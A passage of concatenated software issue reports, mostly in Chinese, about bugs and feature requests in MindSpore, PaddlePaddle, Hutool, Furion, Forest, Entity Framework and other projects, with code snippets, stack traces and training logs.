""../infer_model"", ""Directory of the inference model.""); using Time = decltype(std::chrono::high_resolution_clock::now()); Time time() { return std::chrono::high_resolution_clock::now(); } double time_diff(Time t1, Time t2) { typedef std::chrono::microseconds ms; auto diff = t2 - t1; ms counter = std::chrono::duration_cast&lt;ms&gt;(diff); return counter.count() / 1000.0f; } void prepare_trt_config(AnalysisConfig* config, int batch_size) { // 1. Model directory // case 1: model_dir contains two files: model + params //config-&gt;SetModel(FLAGS_dirname + ""/model"", FLAGS_dirname + ""/params""); // case 2: model_dir contains one model file (__model__) and multiple params config-&gt;SetModel(FLAGS_dirname); // 2. Device // config-&gt;DisableGpu(); config-&gt;EnableUseGpu(500, 0); // 3. General optimization // Graph optimization, including operator fusion //config-&gt;SwitchIrOptim(true); // Memory reuse //config-&gt;EnableMemoryOptim(); // We use ZeroCopyTensor here, so we set config-&gt;SwitchUseFeedFetchOps(false) config-&gt;SwitchUseFeedFetchOps(false); } void test_induced_field(int batch_size, int repeat) { AnalysisConfig config; prepare_trt_config(&amp;config, batch_size); auto predictor = CreatePaddlePredictor(config); int channels = 1; int height = 1; int width = 8; // 8 floats as input vector int input_num = channels * height * width * batch_size; // prepare inputs //float *input = new float[input_num]; //memset(input, 0, input_num * sizeof(float)); double input[] = {9.38945293e+00, 9.54218483e+00, 4.00937128e+00, 2.98900008e-01, 7.20000000e+02, 1.02042408e+01, 9.72727203e+00, 4.30936718e+00}; CHECK(sizeof(input) == input_num * sizeof(double)); auto input_names = predictor-&gt;GetInputNames(); auto input_t = predictor-&gt;GetInputTensor(input_names[0]); input_t-&gt;Reshape({batch_size, channels, height, width}); input_t-&gt;copy_from_cpu(input); // run auto time1 = time(); CHECK(predictor-&gt;ZeroCopyRun()); auto time2 = time(); std::cout &lt;&lt; ""batch: "" &lt;&lt; batch_size &lt;&lt; "" predict cost: "" &lt;&lt; time_diff(time1, time2) / static_cast&lt;float&gt;(repeat) &lt;&lt; "" ms"" &lt;&lt; std::endl; // get the output std::vector&lt;double&gt; out_data; auto output_names = predictor-&gt;GetOutputNames(); auto output_t = predictor-&gt;GetOutputTensor(output_names[0]); std::vector&lt;int&gt; output_shape = output_t-&gt;shape(); int out_num = std::accumulate(output_shape.begin(), output_shape.end(), 1, std::multiplies&lt;int&gt;()); out_data.resize(out_num); output_t-&gt;copy_to_cpu(out_data.data()); for ( size_t j = 0; j &lt; out_num; j++ ) { LOG(INFO) &lt;&lt; ""output[ "" &lt;&lt; j &lt;&lt; "" ]: "" &lt;&lt; out_data[j]; } } paddle::test_induced_field(1, 1); return 0;"
【MindSpore】【Ascend】【C类】【EDCN】评估精度不达标,"评估出精度结果AUC: 0.789987895909914，与资料中给的精度标准对比波动范围超出0.5%，精度不达标。 Hardware Environment(Ascend/GPU/CPU) / 硬件环境: /device ascend : -- CANN 版本: (CANN 5.0.4 B065) --Python 版本:Python 3.7.5 --操作系统版本 (e.g., Ubuntu 18.04):Ubuntu 18.04 --mindspore版本：1.6.1 1、启动容器。 2、完成单卡全量训练。bash run_standalone_train.sh 0 Ascend ../data/mindrecord/ 3、开始评估精度。bash run_eval.sh 0 Ascend /ssd1/wx/EDCN/data/ /ssd1/wx/EDCN/scripts/train_single_Ascend/checkpoint/edcn-10_41322.ckpt 评估精度达标，与精度标准值相比波动不超过0.5%。   <code>: [WARNING] ME(29836:281473501863952,MainProcess):2022-09-05-01:43:40.823.635 [mindspore/dataset/engine/datasets_standard_format.py:221] WARN: global shuffle is not used. 2022-09-05 01:44:55 AUC: 0.789987895909914, eval time: 70.99136662483215s."
swagger-bootstrap-ui文档扩展授权没有效果,"pigx版本: 3.0 操作系统: win7 是否修改包名: 没有 无报错   <code>: 1访问链接 http://pigx-gateway:9999/doc.html 2点击Authorize 菜单 3.输入token 并保存 4.调试接口，返回没有授权 { ""code"": 1, ""msg"": ""Full authentication is required to access this resource"", ""data"": ""Full authentication is required to access this resource"" }"
"LogFactory, debug日志等级开启不了","使用的JDK版本和Hutool版本 JDK1.8 Hutool 4.1.19 debug等级开启失败，日志不打印 ![输入图片说明] (https://images.gitee.com/uploads/images/2018/1031/151905_cc1629f4_1141100.png ""屏幕截图.png"") 打印结果： 日志框架是 默认slf4j   <code>: Log log = LogFactory.get(); boolean debugEnabled = log.isDebugEnabled(); log.info(""debugEnabled:{}"",debugEnabled); log.debug(""debug"");"
sql查询字段重复问题,"SELECT * FROM ( SELECT .<em>, (SELECT realname FROM 72crm_admin_user WHERE user_id=.) AS , (SELECT realname FROM 72crm_admin_user WHERE user_id=.) AS , . AS , .</em> FROM AS LEFT JOIN ON . = . JOIN ( SELECT b.batch_id AS field_batch_id ,MAX(CASE WHEN . = '是否关键决策人' THEN . END) AS ,MAX(CASE WHEN . = 'remark' THEN . END) AS FROM 72crm_admin_fieldv AS a RIGHT JOIN (SELECT batch_id FROM 72crm_crm_contacts AS a WHERE 1=1 AND create_user_id IN (3) AND create_time BETWEEN '2020-01-01 00:00:00' AND '2020-12-31 23:59:59' ORDER BY update_time DESC LIMIT 0,15 ) AS b ON a.batch_id = b.batch_id GROUP BY b.batch_id ) ON . = . ) AS views WHERE 1=1 ORDER BY update_time DESC 查询了72crm_crm_contacts表中的remark（a.*），然后又在72crm_admin_fieldv表中as一个remark，这是什么意思？现在字段冲突报错，目前我将72crm_admin_fieldv的remark改了一个名字，请问是否会有影响？   <code>: a a create_user_id create_user_name a owner_user_id owner_user_name d customer_name customer_name z 72crm_crm_contacts a 72crm_crm_customer d a customer_id d customer_id a name a value 是否关键决策人 a name a value remark z a batch_id z field_batch_id"
进度条用for循环采集循环流程的数据，循环结束时才渲染,"帮看一下layui进度条的问题： 我现在将进度条用for循环，采集循环流程的数据，进行更改渲染变化，整个循环过程都进度条没有动，到循环结束时才渲染一下。我在for循环加了一条输出进度条值：console.log（进度条值），看进度条值都到了100了，循环全部执行完了，进度条才从0开始渲染，最后到100。也就是我们要等一倍的时间。最好的效果，是输出进度条值，要与循环同步。请问有什么好办法在循环时同步动态更改进度值？ var element = layui.element; element.render('progress'); for (var i = 0; i &lt; 100; i++) { }   <code>: (function(i) { setTimeout(function() { element.progress('demo', (i+1) + '%'); }, i * 360); })(i);"
add nn.ZeroPad2d for Padding,"RFC Use this template for requirement to be discussed Requirement Use this template for Confirmed requirements Backgroud（背景信息） Describe/Explain the status of the problem you wish to solve. Attach relevant issues if there is any. Origin（信息来源） Explain which department/team made this request so that its priority can be given. Benefit / Necessity （价值/作用） Describe/Explain the key value by fulfilling the request. Design（设计方案） Describe/Explain the general idea of the design. Pseudo-code is allowed add nn.ZeroPad2d for Padding, same as   <code>: torch.nn.ZeroPad2d"
登录成功后，重复登录会一直在登录页面,"解决办法 重写isAccessAllowed方法，在里面添加是否是登陆判断 @加贝 protected boolean isAccessAllowed(ServletRequest request, ServletResponse response, Object mappedValue) {   <code>: if(isLoginRequest(request, response) &amp;&amp; isLoginSubmission(request, response)){ return false; } return super.isAccessAllowed(request, response, mappedValue); }"
[ST][MS][NET][resnet50-thor][ascend 8p]FPS[11570 can not reach 12500,"resnet50-thor网络在910环境8p训练性能11570/fps达不到12500 / 硬件环境: /device ascend : -- MindSpore version :r.18 commit_id:5231ff8e -- Python version : -- OS platform and distribution : -- GCC/Compiler version : run包:HiAI/HISI_C81/20220415 (/): /mode graph test_ms_resnet50_thor_imagenet_train_check_loss_ascend_8p.py get code from models sh run_distribute_train.sh 网络训练成功，性能精度达标 走给王程浩   <code>: epoch time: 394659.493 ms, per step time: 78.869 ms epoch time: 110715.970 ms, per step time: 22.125 ms"
【mindspore训练】【GRU】【C类】网络模型在r1.3版本环境执行8P训练数据预处理脚本需要重新适配,"一、问题现象： 1、使用 scripts/preprocess.sh 来标记数据集文件并获取 vocab 文件，执行bash preprocess.sh [ DATASET_PATH]，显示数据集路径不对： 修改src/preprocess.py脚本后可以正常处理，修改部分如下： 二、软件版本: --CANN 版本: (CANN 5.0.2.B058) --MindSpore 版本: mindspore 1.3.0 --Python 版本: Python 3.7.5 --操作系统版本 (e.g., Ubuntu 18.04):Ubuntu 18.04   <code>: Traceback (most recent call last): File ""../src/preprocess.py"", line 96, in &lt;module&gt; create_tokenized_sentences(file_path, ""english"") File ""../src/preprocess.py"", line 30, in create_tokenized_sentences total_lines = open(input_files, ""r"").read().splitlines() FileNotFoundError: [Errno 2] No such file or directory: '../data/\r/train.de' dataset_path = args.dataset_path.strip() src_file_list = [""train.de"", ""test.de"", ""val.de""] dst_file_list = [""train.en"", ""test.en"", ""val.en""] for file in src_file_list: file_path = os.path.join(dataset_path, file.strip()) create_tokenized_sentences(file_path, ""english"") for file in dst_file_list: file_path = os.path.join(dataset_path, file.strip()) create_tokenized_sentences(file_path, ""german"")"
希望AnnotationUtil增加对@AliasFor的支持,"JDK版本： java8 hutool版本： 5.5.6 在Spring体系中，有个注解叫，在定义一些标注时非常有用。比如说 如此定义，那么如果在某个类上如下标注 通过spring中的(spring中的工具类)就可以获得这个类的标注，并且retry对象也等于3(因为value和retry互相关联了) 但是以上功能，在hutool中的是无法实现的。得到的标注，value是3，retry是0。 目标是，hutool也能推出自己的，并且在中实现上述功能。 此外，我看到hutool包里有个标注，但是并无作用，而且就代码来看，也未对进行任何处理。 堆栈信息 无 <ol start=""3""> 无   <code>: @AliasFor @Target({ElementType.TYPE}) @Retention(RetentionPolicy.RUNTIME) @Documented @Inherited public @interface LiteflowRetry { @AliasFor(""retry"") int value() default 0; @AliasFor(""value"") int retry() default 0; } @LiteflowRetry(3) public class TestAA { } AnnotationUtils LiteflowRetry liteflowRetryAnnotation = AnnotationUtils.getAnnotation(TestAA.class, LiteflowRetry.class); System.out.println(liteflowRetryAnnotation.retry());//这里等于3 AnnotationUtil AnnotationUtil @AliasFor AnnotationUtil @Alias AnnotationUtil @Alias"
升级到4.7.9之后  Net6  add-migration Name -context DefaultDbContext异常,"Furion 版本号 4.7.9 .NET SDK 版本号 .NET5 .NET6 .NET7 Web 项目类型 WebApi Mvc Razor Pages Blazor Server MinApp 操作系统和版本 Windows Linux MacOS 其他 代码环境 开发环境（Development） 生产环境（Production） 测试环境 执行add-migration Name -context DefaultDbContext报错   <code>: PM&gt; add-migration Name33 -context DefaultDbContext Build started... Build succeeded. System.Reflection.TargetInvocationException: Exception has been thrown by the target of an invocation. ---&gt; System.NullReferenceException: Object reference not set to an instance of an object. at Yitter.IdGenerator.YitIdHelper.NextId() at Furion.Extras.Admin.NET.DEntityBase..ctor() in E:\平台\gitee\backend\Furion.Extras.Admin.NET\Entity\DEntityBase.cs:line 16 at Furion.Extras.Admin.NET.DEntityTenant..ctor() at Admin.NET.Core.Entity.HCS.Services.AgedInfo..ctor() in E:\平台\gitee\backend\Admin.NET.Core\Entity\HCS.Services\AgedInfo.cs:line 91 at System.RuntimeType.CreateInstanceDefaultCtor(Boolean publicOnly, Boolean wrapExceptions) --- End of inner exception stack trace --- at System.RuntimeType.CreateInstanceDefaultCtor(Boolean publicOnly, Boolean wrapExceptions) at System.Activator.CreateInstance(Type type, Boolean nonPublic, Boolean wrapExceptions) at Furion.DatabaseAccessor.AppDbContextBuilder.ConfigureEntityTypeBuilder(Type entityType, EntityTypeBuilder entityBuilder, DbContext dbContext, Type dbContextLocator, DbContextCorrelationType dbContextCorrelationType) at Furion.DatabaseAccessor.AppDbContextBuilder.ConfigureDbContextEntity(ModelBuilder modelBuilder, DbContext dbContext, Type dbContextLocator) at Furion.DatabaseAccessor.AppDbContext`2.OnModelCreating(ModelBuilder modelBuilder) at Admin.NET.EntityFramework.Core.DefaultDbContext.OnModelCreating(ModelBuilder builder) in E:\平台\gitee\backend\Admin.NET.EntityFramework.Core\DbContexts\DefaultDbContext.cs:line 96 at Microsoft.EntityFrameworkCore.Infrastructure.ModelCustomizer.Customize(ModelBuilder modelBuilder, DbContext context) at Microsoft.EntityFrameworkCore.Infrastructure.ModelSource.CreateModel(DbContext context, IConventionSetBuilder conventionSetBuilder, ModelDependencies modelDependencies) at Microsoft.EntityFrameworkCore.Infrastructure.ModelSource.GetModel(DbContext context, ModelCreationDependencies modelCreationDependencies, Boolean designTime) at Microsoft.EntityFrameworkCore.Internal.DbContextServices.CreateModel(Boolean designTime) at Microsoft.EntityFrameworkCore.Internal.DbContextServices.get_Model() at Microsoft.EntityFrameworkCore.Infrastructure.EntityFrameworkServicesBuilder.&lt;&gt;c.&lt;TryAddCoreServices&gt;b__8_4(IServiceProvider p) at Microsoft.Extensions.DependencyInjection.ServiceLookup.CallSiteVisitor`2.VisitCallSiteMain(ServiceCallSite callSite, TArgument argument) at Microsoft.Extensions.DependencyInjection.ServiceLookup.CallSiteRuntimeResolver.VisitCache(ServiceCallSite callSite, RuntimeResolverContext context, ServiceProviderEngineScope serviceProviderEngine, RuntimeResolverLock lockType) at Microsoft.Extensions.DependencyInjection.ServiceLookup.CallSiteRuntimeResolver.VisitScopeCache(ServiceCallSite callSite, RuntimeResolverContext context) at Microsoft.Extensions.DependencyInjection.ServiceLookup.CallSiteVisitor`2.VisitCallSite(ServiceCallSite callSite, TArgument argument) at Microsoft.Extensions.DependencyInjection.ServiceLookup.CallSiteRuntimeResolver.VisitConstructor(ConstructorCallSite constructorCallSite, RuntimeResolverContext context) at Microsoft.Extensions.DependencyInjection.ServiceLookup.CallSiteVisitor`2.VisitCallSiteMain(ServiceCallSite callSite, TArgument argument) at Microsoft.Extensions.DependencyInjection.ServiceLookup.CallSiteRuntimeResolver.VisitCache(ServiceCallSite callSite, RuntimeResolverContext context, ServiceProviderEngineScope serviceProviderEngine, RuntimeResolverLock lockType) at Microsoft.Extensions.DependencyInjection.ServiceLookup.CallSiteRuntimeResolver.VisitScopeCache(ServiceCallSite callSite, RuntimeResolverContext context) at Microsoft.Extensions.DependencyInjection.ServiceLookup.CallSiteVisitor`2.VisitCallSite(ServiceCallSite callSite, TArgument argument) at Microsoft.Extensions.DependencyInjection.ServiceLookup.CallSiteRuntimeResolver.VisitConstructor(ConstructorCallSite constructorCallSite, RuntimeResolverContext context) at Microsoft.Extensions.DependencyInjection.ServiceLookup.CallSiteVisitor`2.VisitCallSiteMain(ServiceCallSite callSite, TArgument argument) at Microsoft.Extensions.DependencyInjection.ServiceLookup.CallSiteRuntimeResolver.VisitCache(ServiceCallSite callSite, RuntimeResolverContext context, ServiceProviderEngineScope serviceProviderEngine, RuntimeResolverLock lockType) at Microsoft.Extensions.DependencyInjection.ServiceLookup.CallSiteRuntimeResolver.VisitScopeCache(ServiceCallSite callSite, RuntimeResolverContext context) at Microsoft.Extensions.DependencyInjection.ServiceLookup.CallSiteVisitor`2.VisitCallSite(ServiceCallSite callSite, TArgument argument) at Microsoft.Extensions.DependencyInjection.ServiceLookup.CallSiteRuntimeResolver.VisitConstructor(ConstructorCallSite constructorCallSite, RuntimeResolverContext context) at Microsoft.Extensions.DependencyInjection.ServiceLookup.CallSiteVisitor`2.VisitCallSiteMain(ServiceCallSite callSite, TArgument argument) at Microsoft.Extensions.DependencyInjection.ServiceLookup.CallSiteRuntimeResolver.VisitCache(ServiceCallSite callSite, RuntimeResolverContext context, ServiceProviderEngineScope serviceProviderEngine, RuntimeResolverLock lockType) at Microsoft.Extensions.DependencyInjection.ServiceLookup.CallSiteRuntimeResolver.VisitScopeCache(ServiceCallSite callSite, RuntimeResolverContext context) at Microsoft.Extensions.DependencyInjection.ServiceLookup.CallSiteVisitor`2.VisitCallSite(ServiceCallSite callSite, TArgument argument) at Microsoft.Extensions.DependencyInjection.ServiceLookup.CallSiteRuntimeResolver.VisitConstructor(ConstructorCallSite constructorCallSite, RuntimeResolverContext context) at Microsoft.Extensions.DependencyInjection.ServiceLookup.CallSiteVisitor`2.VisitCallSiteMain(ServiceCallSite callSite, TArgument argument) at Microsoft.Extensions.DependencyInjection.ServiceLookup.CallSiteRuntimeResolver.VisitCache(ServiceCallSite callSite, RuntimeResolverContext context, ServiceProviderEngineScope serviceProviderEngine, RuntimeResolverLock lockType) at Microsoft.Extensions.DependencyInjection.ServiceLookup.CallSiteRuntimeResolver.VisitScopeCache(ServiceCallSite callSite, RuntimeResolverContext context) at Microsoft.Extensions.DependencyInjection.ServiceLookup.CallSiteVisitor`2.VisitCallSite(ServiceCallSite callSite, TArgument argument) at Microsoft.Extensions.DependencyInjection.ServiceLookup.CallSiteRuntimeResolver.VisitConstructor(ConstructorCallSite constructorCallSite, RuntimeResolverContext context) at Microsoft.Extensions.DependencyInjection.ServiceLookup.CallSiteVisitor`2.VisitCallSiteMain(ServiceCallSite callSite, TArgument argument) at Microsoft.Extensions.DependencyInjection.ServiceLookup.CallSiteRuntimeResolver.VisitCache(ServiceCallSite callSite, RuntimeResolverContext context, ServiceProviderEngineScope serviceProviderEngine, RuntimeResolverLock lockType) at Microsoft.Extensions.DependencyInjection.ServiceLookup.CallSiteRuntimeResolver.VisitScopeCache(ServiceCallSite callSite, RuntimeResolverContext context) at Microsoft.Extensions.DependencyInjection.ServiceLookup.CallSiteVisitor`2.VisitCallSite(ServiceCallSite callSite, TArgument argument) at Microsoft.Extensions.DependencyInjection.ServiceLookup.CallSiteRuntimeResolver.Resolve(ServiceCallSite callSite, ServiceProviderEngineScope scope) at Microsoft.Extensions.DependencyInjection.ServiceLookup.DynamicServiceProviderEngine.&lt;&gt;c__DisplayClass2_0.&lt;RealizeService&gt;b__0(ServiceProviderEngineScope scope) at Microsoft.Extensions.DependencyInjection.ServiceProvider.GetService(Type serviceType, ServiceProviderEngineScope serviceProviderEngineScope) at Microsoft.Extensions.DependencyInjection.ServiceLookup.ServiceProviderEngineScope.GetService(Type serviceType) at Microsoft.Extensions.DependencyInjection.ServiceProviderServiceExtensions.GetRequiredService(IServiceProvider provider, Type serviceType) at Microsoft.Extensions.DependencyInjection.ServiceProviderServiceExtensions.GetRequiredService[T](IServiceProvider provider) at Microsoft.EntityFrameworkCore.DbContext.get_DbContextDependencies() at Microsoft.EntityFrameworkCore.DbContext.get_ContextServices() at Microsoft.EntityFrameworkCore.DbContext.get_InternalServiceProvider() at Microsoft.EntityFrameworkCore.DbContext.Microsoft.EntityFrameworkCore.Infrastructure.IInfrastructure&lt;System.IServiceProvider&gt;.get_Instance() at Microsoft.EntityFrameworkCore.Infrastructure.Internal.InfrastructureExtensions.GetService[TService](IInfrastructure`1 accessor) at Microsoft.EntityFrameworkCore.Infrastructure.AccessorExtensions.GetService[TService](IInfrastructure`1 accessor) at Microsoft.EntityFrameworkCore.Design.Internal.DbContextOperations.CreateContext(Func`1 factory) at Microsoft.EntityFrameworkCore.Design.Internal.DbContextOperations.CreateContext(String contextType) at Microsoft.EntityFrameworkCore.Design.Internal.MigrationsOperations.AddMigration(String name, String outputDir, String contextType, String namespace) at Microsoft.EntityFrameworkCore.Design.OperationExecutor.AddMigrationImpl(String name, String outputDir, String contextType, String namespace) at Microsoft.EntityFrameworkCore.Design.OperationExecutor.AddMigration.&lt;&gt;c__DisplayClass0_0.&lt;.ctor&gt;b__0() at Microsoft.EntityFrameworkCore.Design.OperationExecutor.OperationBase.&lt;&gt;c__DisplayClass3_0`1.&lt;Execute&gt;b__0() at Microsoft.EntityFrameworkCore.Design.OperationExecutor.OperationBase.Execute(Action action) Exception has been thrown by the target of an invocation. PM&gt;"
请求返回后转换为实体失败,"Forest: 1.5.24 version Backend: (okhttp或httpclient)/version 该问题是如何引起的？ 请求回来后，转换自己定义的实体类转换失败 报错信息/完整请求日志（如果没有请求日志请把开关打开） ERROR o.jeecg.common.exception.JeecgBootExceptionHandler:79 - com.dtflys.forest.exceptions.ForestConvertException: [Forest] auto converter: 'DefaultAutoConverter' error: [Forest] json converter: 'ForestFastjsonConverter' error: syntax error, expect {, actual [, pos 1299, fastjson-version 1.2.83 接口定义（必要时请提供） @BaseRequest(baseURL = ""${unitapi}"",contentType = ""application/json; charset=UTF-8"",interceptor = UnitInterceptor.class) public interface FaqClient { }   <code>: @ApiOperation(""获取问答对列表"") @PostMapping(""/list"") public FaqResult faqSkillList(@RequestBody FaqSkillQueryParam faqSkillQueryParam) { return faqClient.faqSkillList(faqSkillQueryParam); } @Post(url = ""/faqskill/faqPair/list"") FaqResult faqSkillList(@Body FaqSkillQueryParam faqSkillQueryParam);"
[MS/modelzoo][ST][yolov3_darknet53][ascend310] log print error ,"310推理后日志打印error，不影响正常功能 问题commitid：90b31530 / 硬件环境: /device /Ascend310/ : -- MindSpore version :master commit_id:99d3df17 -- Python version : -- OS platform and distribution : -- GCC/Compiler version : (/): /mode graph ms_yolov3_darknet53_coco2014_mindir_infer_0003 get code from models python ms_yolov3_darknet53_coco2014_mindir_infer_0003 训练成功 备注 提给龚立尧   <code>: [ERROR] ASCENDCL(39301,main):2022-09-19-23:29:47.919.306 [acl.cpp:179]39301 aclFinalize: [FINAL][DEFAULT][Finalize][Acl]repeatedly finalized"
apiboot oauth文档未补充“支持自定义认证服务器OAuth2认证失败时响应内容”示例,"AuthorizationDeniedResponse接口，来自定义授权服务器认证失败的响应格式，还可以自定义授权失败的响应状态（HttpStatus）   <code>: @Component public class CustomAuthorizationDeniedResponse implements AuthorizationDeniedResponse { @Override public void serializeResponse(ApiBootOAuth2Exception e, JsonGenerator generator) { try { generator.writeObjectField(""code"", e.getHttpErrorCode()); generator.writeObjectField(""message"", e.getMessage()); } catch (Exception ex) { ex.printStackTrace(); } } }"
[OCR]paddle预测，输出output层的信息时发现日志有丢失,"想利用PADDLE的训练程序对训练数据进行预测，为加快预测速度，对训练数据按照图片的宽度进行排序，batch_size=32, 然后在network.conf里面增加对输出层的信息输出： 在程序运行完成后，发现log里面的输出信息有丢失。不清楚是什么原因。 从日志里面拷贝出一部分数据，如下（25967264行信息未打印完全）：   <code>: Evaluator(name = ""output_printer"", type = ""max_id_printer"", inputs = [""output""]) 25967255 88 : 16.8427, 25967256 95 : 21.5762, 25967257 95 : 18.9083, 25967258 78 : 17.2552, 25967259 95 : 20.2771, 25967260 95 : 18.9346, 25967261 84 : 18.7365, 25967262 95 : 19.8724, 25967263 94 : 17.5951, 25967264 9 25967265 I0607 21:51:35.054631 24851 Trainer.cpp:706] Pass=0 samples=700480"
静态图matmul使用问题,"paddle1.8 静态图 我想在静态图对两个tensor进行矩阵乘法，在引入下面这段代码导致显存占用急剧上升(应该是q和p维度过大导致的)，使得模型仅能使用很小batch，想请教下有没有优化的方法？ 有其他同学验证过类似的操作在静态图会导致显存上升很多，但动态图会好很多。   <code>: # q = [batch, heads, len, hidden] # p = [batch, heads, len, len, hidden] reshape_q = fluid.layers.unsqueeze(input=q, axes=[3]) product = layers.matmul(x=reshape_q, y=p, transpose_y=True) product = fluid.layers.squeeze(product, axes=[3])"
[MDT][FUNC]AdjustHue算子报错信息有误,"1.AdjustHue算子使用二维input时，报错信息不正确 2.AdjustHue算子参数使用负数时报错信息不正确 3.AdjustHue算子input的不支持的dtype数据类型时throws openCV的报错信息 / 硬件环境: GPU : -- MindSpore version :MindSpore 1.8.0 [sha1]:264cc7d6 -- Python version : Python 3.7.5 -- OS platform and distribution :Linux Ubuntu 18.04.2 -- GCC/Compiler version : gcc (GCC) 7.3.0 (/): /mode pynative /mode graph 报错信息准确，提示友好   <code>: def testcase1(): image = np.random.randint(0, 255, (30, 30)).astype(np.uint8) adjusthue_op = v_trans.AdjustHue(hue_factor=0.2) out = adjusthue_op(image) // RuntimeError: Unexpected error. AdjustHue: image should have at least two // dimensions, but got: 2 def testcase2(): image = np.random.randint(0, 255, (30, 30, 3)).astype(np.uint8) adjusthue_op = v_trans.AdjustHue(hue_factor=-0.5) out = adjusthue_op(image) // ValueError: Input is not within the required interval of [0, 16777216]. def testcase3(): image = np.random.randint(0, 255, (30, 30, 3)).astype(np.float64) adjusthue_op = v_trans.AdjustHue(hue_factor=0.2) out = adjusthue_op(image) // throws openCV的报错信息"
Internal parameters support greater than 4G,"RFC Internal parameters is currently not support greater than 4G Trail https://gitee.com/mindspore/dashboard?issue_id=I1DDFP No. Task Description Related Issue(URL) 1 2   <code>: class Print34(Cell): def __init__(self): super().__init__() self.print = op.Print() def construct(self,x): self.print(""val:"",x) return x def test_print_input_1024x1024x512x7(): input = Tensor(np.random.randn(1024, 1024, 512, 7).astype(np.float32)) net = Print34() out = net(input) print(""val1:"",input)"
把jeecg当作子应用引入vite-plugin-theme报错,版本号：   <code>: vue3.0 目前我们有两个jeecg项目用qiankun，一个做主引用，一个做子应用，但是引入的时候子应用报错，导致页面样式错乱了，请问怎么处理这个
配置项 mapper.ORDER=BEFORE 设置无效,"该配置在 <em>mapper-spring-boot-starter 1.2.3</em> 版本中，正常使用。 但升级到 <em>mapper-spring-boot-starter 2.0</em> 之后，ID就无法获得了。 数据库：<em>Oracle Database 11g Enterprise Edition Release 11.2.0.4.0 - 64bit Production</em> 不知道是不是升级版本之后还需要有别的更改。   <code>: @Id @Column(name = ""ID"") @GeneratedValue(strategy = GenerationType.IDENTITY, generator = ""select sys_guid() from dual"") private String id;"
关于IUnitWork Update Delete 实现的问题。,"例如 其中的 批量更新方法： 这段代码本身的 Update(entity) 调用的是 EntityFramework.Extensions 库扩展方法。 实际上，EntityFramework.Extensions 里面的扩展方法，自身已经生成了数据库脚本并执行了，而且没有更新EntityFramework的。并无SaveChanges()需要。Savechanges()应该也检测不到它的修改。 这点我实际测试过： 执行结果： 实际监听到的SQL语句: 有两个事务执行过： 实际上，单独的Delete、Update方法这样设计也是合理，但写到Uniwork里面就会让人造成误解，会觉得用完Delete后SaveChanges()时还是同一个事务。   <code>: public int Update&lt;T&gt;(Expression&lt;Func&lt;T, bool&gt;&gt; where, Expression&lt;Func&lt;T, T&gt;&gt; entity) where T : class { return Context.Set&lt;T&gt;().Where(where).Update(entity); } public static int Update&lt;TEntity&gt;(this IQueryable&lt;TEntity&gt; source, Expression&lt;Func&lt;TEntity, TEntity&gt;&gt; updateExpression) where TEntity : class; static void Main(string[] args) { using (EFBatchTestContext db = new EFBatchTestContext()) { TestTable tt = db.TestTable.Where(x =&gt; x.Status == 1).FirstOrDefault(); string content = tt.Content; Console.WriteLine(""Id:[{0}]\tContent:{1}\tStatus:[{2}]"", tt.ID, tt.Content, tt.Status); tt.Status = 3; db.TestTable.Where(x =&gt; x.Status == 1).Delete(); db.SaveChanges(); tt = db.TestTable.Where(x =&gt; x.Content == content).FirstOrDefault(); if (tt != null) Console.WriteLine(""Id:[{0}]\tContent:{1}\tStatus:[{2}]"", tt.ID, tt.Content, tt.Status); else Console.WriteLine(""tt is NULL""); } } Id:[3434] Content:content3434 Status:[1] 未经处理的异常: System.Data.Entity.Infrastructure.DbUpdateConcurrencyException: Store update, insert, or delete stateme nt affected an unexpected number of rows (0). Entities may have been modified or deleted since entities were loaded. See http://go.microsoft.com/fwlink/?LinkId=472540 for information on understanding and handling optimistic concurrency exce ptions. ---&gt; System.Data.Entity.Core.OptimisticConcurrencyException: Store update, insert, or delete statement affected an unexpected number of rows (0). Entities may have been modified or deleted since entities were loaded. See http://go.m icrosoft.com/fwlink/?LinkId=472540 for information on understanding and handling optimistic concurrency exceptions. 在 System.Data.Entity.Core.Mapping.Update.Internal.UpdateTranslator.ValidateRowsAffected(Int64 rowsAffected, UpdateCo mmand source) 在 System.Data.Entity.Core.Mapping.Update.Internal.UpdateTranslator.Update() 在 System.Data.Entity.Core.Objects.ObjectContext.ExecuteInTransaction[T](Func`1 func, IDbExecutionStrategy executionS trategy, Boolean startLocalTransaction, Boolean releaseConnectionOnSuccess) 在 System.Data.Entity.Core.Objects.ObjectContext.SaveChangesToStore(SaveOptions options, IDbExecutionStrategy executi onStrategy, Boolean startLocalTransaction) 在 System.Data.Entity.SqlServer.DefaultSqlExecutionStrategy.Execute[TResult](Func`1 operation) 在 System.Data.Entity.Core.Objects.ObjectContext.SaveChangesInternal(SaveOptions options, Boolean executeInExistingTr ansaction) 在 System.Data.Entity.Internal.InternalContext.SaveChanges() --- 内部异常堆栈跟踪的结尾 --- 在 System.Data.Entity.Internal.InternalContext.SaveChanges() 在 BatchTest.CApp.Program.Main(String[] args) 位置 e:\Works\COApp\BatchTest.CApp\CApp\Program.cs:行号 22"
Exception thrown when running image-classificaiton demo with no modification,"$ sh train.sh # cpu=1, nordma=1, trainer=100 Stack trace as follows: I1130 18:11:30.913192 20859 GradientMachine.cpp:112] Saving parameters to ./cifar_vgg_model/pass-00001 I1130 18:11:30.942971 20859 Util.cpp:230] copy vgg_16_cifar.py to ./cifar_vgg_model/pass-00001 ......... I1130 18:15:06.323289 20859 TrainerInternal.cpp:165] Batch=100 samples=12800 AvgCost=2.3082 CurrentCost=2.3082 Eval: classification_error_evaluator=0.895781 CurrentEval: classification_error_evaluator=0.895781 ......... I1130 18:18:04.653513 20859 TrainerInternal.cpp:165] Batch=200 samples=25600 AvgCost=2.30641 CurrentCost=2.30461 Eval: classification_error_evaluator=0.897266 CurrentEval: classification_error_evaluator=0.89875 ......... I1130 18:21:02.300884 20859 TrainerInternal.cpp:165] Batch=300 samples=38400 AvgCost=2.2999 CurrentCost=2.28689 Eval: classification_error_evaluator=0.890938 CurrentEval: classification_error_evaluator=0.878281 .........I1130 18:23:43.368007 20859 TrainerInternal.cpp:182] Pass=2 Batch=391 samples=50000 AvgCost=2.29892 Eval: classification_error_evaluator=0.890213 I1130 18:24:21.205286 20859 Tester.cpp:127] Test samples=10000 cost=16.9838 Eval: classification_error_evaluator=0.856549 I1130 18:24:21.205492 20859 GradientMachine.cpp:112] Saving parameters to ./cifar_vgg_model/pass-00002 I1130 18:24:21.238078 20859 Util.cpp:230] copy vgg_16_cifar.py to ./cifar_vgg_model/pass-00002 ......... I1130 18:27:56.790280 20859 TrainerInternal.cpp:165] Batch=100 samples=12800 AvgCost=2.30803 CurrentCost=2.30803 Eval: classification_error_evaluator=0.900547 CurrentEval: classification_error_evaluator=0.900547 